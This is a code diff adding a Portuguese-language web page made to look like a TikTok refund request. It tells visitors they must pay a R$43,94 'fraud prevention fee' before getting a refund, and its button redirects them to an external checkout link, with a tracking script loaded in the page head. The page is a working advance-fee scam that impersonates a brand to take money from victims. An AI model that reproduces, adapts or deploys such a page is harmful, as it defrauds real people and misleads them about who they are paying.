@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+     <script
+            src="https://cdn.xtracky.com/scripts/utm-handler.js"
+            data-token="0fcfda61-58e6-4822-9e5a-0184c5956ecc"
+      data-click-id-param="click_id">
+    >
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitação</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #000;
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* TikTok style glowing orbs */
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .orb-1 {
+            width: 300px;
+            height: 300px;
+            background: #fe2c55;
+            top: -100px;
+            left: -100px;
+            animation: orbFloat1 8s ease-in-out infinite;
+        }
+
+        .orb-2 {
+            width: 250px;
+            height: 250px;
+            background: #25f4ee;
+            bottom: -80px;
+            right: -80px;
+            animation: orbFloat2 8s ease-in-out infinite;
+        }
+
+        .orb-3 {
+            width: 150px;
+            height: 150px;
+            background: #fe2c55;
+            bottom: 20%;
+            left: 10%;
+            opacity: 0.25;
+            animation: orbFloat3 10s ease-in-out infinite;
+        }
+
+        @keyframes orbFloat1 {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, 30px); }
+        }
+
+        @keyframes orbFloat2 {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(-30px, -30px); }
+        }
+
+        @keyframes orbFloat3 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(20px, -20px) scale(1.1); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 50px 40px;
+            width: 100%;
+            max-width: 420px;
+            margin: 20px;
+        }
+
+        /* Logo with TikTok 3D effect */
+        .logo-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 35px;
+        }
+
+        .logo-container img {
+            width: 100px;
+            height: auto;
+            position: relative;
+            z-index: 3;
+        }
+
+        /* TikTok RGB split effect */
+        .logo-effect {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-effect::before,
+        .logo-effect::after {
+            content: '';
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: url('2fa26c9dd31ce860dc627e5375f58a98.png') center/contain no-repeat;
+        }
+
+        .logo-effect::before {
+            transform: translate(-3px, 2px);
+            filter: opacity(0.7);
+            mix-blend-mode: multiply;
+        }
+
+        .logo-effect::after {
+            transform: translate(3px, -2px);
+            filter: opacity(0.7);
+            mix-blend-mode: screen;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            margin-bottom: 30px;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+
+        /* Card */
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 24px 28px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .card p {
+            font-size: 1rem;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.9);
+            margin: 0;
+        }
+
+        .card strong {
+            color: #fe2c55;
+            font-weight: 700;
+        }
+
+        /* TikTok style button with RGB split */
+        .btn-tiktok {
+            position: relative;
+            display: block;
+            width: 100%;
+            padding: 18px 32px;
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            color: #fff;
+            background: #fe2c55;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .btn-tiktok::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -4px;
+            right: 4px;
+            bottom: 0;
+            background: #25f4ee;
+            border-radius: 4px;
+            z-index: -1;
+        }
+
+        .btn-tiktok::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 4px;
+            right: -4px;
+            bottom: 0;
+            background: #fe2c55;
+            border-radius: 4px;
+            z-index: -1;
+        }
+
+        .btn-tiktok:hover {
+            transform: scale(1.02);
+        }
+
+        .btn-tiktok:active {
+            transform: scale(0.98);
+        }
+
+        /* Floating music notes */
+        .music-notes {
+            position: absolute;
+            font-size: 24px;
+            opacity: 0.12;
+            pointer-events: none;
+            color: #fff;
+        }
+
+        .note-1 { top: 12%; right: 12%; animation: noteFloat 4s ease-in-out infinite; }
+        .note-2 { bottom: 20%; left: 10%; animation: noteFloat 5s ease-in-out infinite reverse; }
+        .note-3 { top: 35%; right: 8%; animation: noteFloat 6s ease-in-out infinite; font-size: 18px; }
+        .note-4 { bottom: 35%; right: 15%; animation: noteFloat 7s ease-in-out infinite reverse; font-size: 20px; }
+
+        @keyframes noteFloat {
+            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0.12; }
+            50% { transform: translateY(-20px) rotate(15deg); opacity: 0.2; }
+        }
+
+        /* Bottom gradient line */
+        .accent-line {
+            width: 60px;
+            height: 4px;
+            background: linear-gradient(90deg, #25f4ee, #fe2c55);
+            border-radius: 2px;
+            margin: 40px auto 0;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 40px 24px;
+            }
+
+            h2 {
+                font-size: 1.8rem;
+            }
+
+            .card {
+                padding: 20px 22px;
+            }
+
+            .logo-container img {
+                width: 80px;
+            }
+
+            .logo-effect::before,
+            .logo-effect::after {
+                width: 80px;
+                height: 80px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Glowing orbs -->
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+
+    <!-- Music notes -->
+    <div class="music-notes note-1">♪</div>
+    <div class="music-notes note-2">♫</div>
+    <div class="music-notes note-3">♪</div>
+    <div class="music-notes note-4">♫</div>
+
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo-effect"></div>
+            <img src="2fa26c9dd31ce860dc627e5375f58a98.png" alt="Logo">
+        </div>
+
+        <h2>Solicitação de Reembolso do TikTok</h2>
+
+        <div class="card">
+            <p><strong>Importante:</strong>Para processar seu reembolso, é necessário pagar uma taxa de prevenção contra fraudes de R$43,94. Não se preocupe, esse valor será reembolsado junto com o valor do reembolso. Como desculpas pelo desconforto, também enviaremos o saldo pendente na plataforma.</p>
+        </div>
+
+        <form id="refundForm">
+            <button type="submit" class="btn-tiktok">Reembolsar agora</button>
+        </form>
+
+        <div class="accent-line"></div>
+    </div>
+
+    <script>
+        document.getElementById("refundForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            window.location.href = "https://www.pagamentos-seguro.link/checkout/3548c2f8-3f47-4479-84a1-b3e4b0c66ecf";
+        });
+    </script>
+</body>
+</html>
